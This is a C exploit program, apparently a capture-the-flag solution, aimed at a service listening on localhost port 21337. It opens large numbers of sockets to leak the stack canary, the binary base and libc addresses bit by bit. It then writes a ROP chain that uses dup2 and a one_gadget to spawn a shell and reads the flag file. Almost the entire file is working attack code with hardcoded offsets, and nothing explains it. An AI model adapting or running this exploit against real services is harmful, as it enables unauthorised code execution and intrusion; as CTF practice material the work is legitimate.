// gcc exploit.c -no-pie -fopenmp -o exploit

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/mman.h>

#define SOCKETS_1 ((1024+64*1)-4)
#define SOCKETS_2 (64*8)
#define SOCKETS_3 (64*11)

struct sockaddr_in s_in;

static inline void init_sin() {
  s_in.sin_family = AF_INET;
  s_in.sin_port = htons(21337);
  s_in.sin_addr.s_addr = inet_addr("127.0.0.1");
}

static inline int con() {
	int sockfd;
   
	sockfd = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, IPPROTO_TCP);
	while(connect(sockfd, (struct sockaddr*)&s_in, sizeof(s_in)) < 0);

	return sockfd;
}

int main(void) {
	char buf[0x10];
	int fd;

	void *mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	((char*)mem)[0xfff] = '\n';

	setbuf(stdout, NULL);

	init_sin();

	#pragma omp parallel for
	for(int i=0; i<SOCKETS_1; i++)
		con();

	fd = open("/dev/null", O_RDONLY);
	close(fd);

	#pragma omp parallel for
	for(int i=0; i<SOCKETS_2; i++)
		con();

	for(int i=0; i<SOCKETS_3; i++)
		con();

	uint64_t stack[(SOCKETS_2+SOCKETS_3)/64] = {0};
	int tmp_fd = fd;
	for(int i=0; i<sizeof(stack)/sizeof(unsigned long); i++)
		for(int j=0; j<64; j++){
			if(read(tmp_fd++, buf, sizeof(buf)) > 0){
				int idx = atoi(buf+8)-1088;
				stack[idx/64] |= (uint64_t)1<<(idx%64);
			}
			else if(i == 0)
				goto CLEAR;
			if(i == 4 || i >= 8)
				goto CLEAR;
			continue;

CLEAR:
			#pragma omp parallel for
			for(int i=0; i<0x200; i++)
				write(tmp_fd-1, mem, 0x1000);
		}

	for(int i=0; i<sizeof(stack)/sizeof(unsigned long); i++)
		printf("%#lx ", stack[i]);
	putchar('\n');

	uint64_t canary = stack[0];
	printf("canary         = %#lx\n", canary);

	uint64_t addr_csu_init = stack[2];
	uint64_t addr_bin_base 	= addr_csu_init - 0x38e0;
	printf("addr_bin_base  = %#lx\n", addr_bin_base);

	uint64_t addr_stack = stack[5];
	printf("addr_stack     = %#lx\n", addr_stack);

	uint64_t addr_libc_main = stack[8] - 0xf3;
	uint64_t addr_libc_base	= addr_libc_main - 0x26fc0;
	uint64_t addr_libc_onegadget = addr_libc_base + 0xe6aee;
	uint64_t addr_libc_dup2 = addr_libc_base + 0x1118a0;
	uint64_t addr_libc_rdi = addr_libc_base + 0x00026b72;
	uint64_t addr_libc_rsi = addr_libc_base + 0x00027529;
	printf("addr_libc_base = %#lx\n", addr_libc_base);

	uint64_t rop[] = {addr_libc_rdi, 4, addr_libc_rsi, 0, addr_libc_dup2, addr_libc_rdi, 4, addr_libc_rsi, 1, addr_libc_dup2, addr_libc_onegadget};
	tmp_fd = fd + SOCKETS_2;
	for(int i=0; i<sizeof(rop)/sizeof(uint64_t); i++){
		uint64_t v = rop[i];
		for(int j=0; j<64; j++){
			if(v & 1){
				#pragma omp parallel for
				for(int k=0; k<0x200; k++)
					read(tmp_fd, mem, 0x1000);
				write(tmp_fd, "\n", 1);
			}
			v >>= 1;
			tmp_fd++;
		}
	}

	write(3, "exit\n", 5);

	getchar();

	dprintf(3, "cat *flag*\n");
	read(3, buf, sizeof(buf));
	puts(buf);

	for(;;){}

	return 0;
}
